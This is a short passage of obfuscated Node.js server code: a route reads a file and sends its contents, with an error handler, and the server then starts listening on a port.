fs[_0x5d6cf1(0xb2)][_0x5d6cf1(0xfc)](_0x2a3a68,'utf8');_0xd2af7c['send'](_0x3fabea);}catch(_0x5decb6){_0xd2af7c[_0x5d6cf1(0x113)](_0x5d6cf1(0x151));}}),app[_0x2f54a0(0x13b)](PORT,()=>console[_0x2f54a0(0x10d)](_0x2f54a0(0xcd)+PORT+'!'));
